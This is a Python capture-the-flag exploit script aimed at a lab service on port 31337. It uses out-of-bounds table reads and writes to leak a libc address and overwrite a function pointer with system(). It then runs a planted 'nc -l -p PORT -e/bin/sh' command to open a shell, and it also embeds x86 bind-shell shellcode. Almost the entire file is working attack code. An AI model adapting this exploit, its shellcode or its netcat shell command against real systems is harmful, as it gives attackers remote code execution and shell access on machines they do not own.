__author__ = 'clu'

import struct
import re
import sys

sys.path.append('../../../tools')

import ctf
import random

HOST = '192.168.56.101'
PORT = 31337

shell_port = random.randint(1111,65536)

bind_shellcode = (
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
"\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
"\x66\x68"+ struct.pack('>H', shell_port) + "\x66\x53\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
"\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
"\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
"\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
"\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
"\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"
)

'''
Commands:
	read	Read value from given index in table
	write	Write value to given index in table
	func1	Change operation to addition
	func2	Change operation to multiplication
	math	Perform math operation on table
	exit	Quit and disconnect
'''

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

def read_addr(s, addr):
    base = 0x0804C040

    # word align this to the previous word
    aligned_addr = addr - (addr % 0x4)

    diff_in_words = (aligned_addr-base)/4

    ctf.send(s,'read\n')
    ctf.recv(s)
    ctf.send(s, str(diff_in_words) + '\n')
    val_string = ctf.recv(s)
    value = int(re.search(': (-?\d+)', val_string).group(1))

    value = int(tohex(value, 32),16)

    return value


def write_addr(s, addr, val):
    base = 0x0804C040

    # word align this to the previous word
    aligned_addr = addr - (addr % 0x4)

    diff_in_words = (aligned_addr-base)/4

    # The high bits get shifted off during the *4 multiply
    # Set the high bit so this looks like a negative number
    if (diff_in_words > 9):
        diff_in_words = -(2**31) + diff_in_words

    ctf.send(s,'write\n')
    ctf.recv(s)
    ctf.send(s, str(diff_in_words) + '\n')
    ctf.recv(s)

    if val > 2**31:
        val = val - 2**31
        val = -(2**31) + val

    ctf.send(s, str(val) + '\n')
    ctf.recv(s)

def execute(s, addr):
    math_fn = 0x0804C078
    write_addr(s, math_fn, addr)
    ctf.send(s, 'math\n')

def string_to_int_array(string):
    hex_string = string.encode("hex")

    int_array = []

    for byte in ctf.chunks(hex_string,2*4):
        int_array.append(struct.unpack('i',struct.pack('>i',int(byte, 16)))[0])

    return int_array

def main():
    s = ctf.connect(HOST,PORT)

    while 'exit' not in ctf.recv(s, dump=False):
        pass

    arr = string_to_int_array("nc -l -p %d -e/bin/sh " % shell_port)
    print(arr)

    val_base = 0x0804C040
    for num in arr:
        write_addr(s, val_base, num)
        val_base = val_base + 4

    libc_main = read_addr(s, 0x0804BF9C)
    offset_to_system = 0x237c0
    system_addr = libc_main + offset_to_system

    print('libc_main @ 0x%X' % libc_main)
    print('offset = %X' % offset_to_system)
    print('system @ 0x%X' % system_addr)

    execute(s, system_addr)

    ctf.shell(HOST, shell_port)

if __name__ == '__main__':
    main()
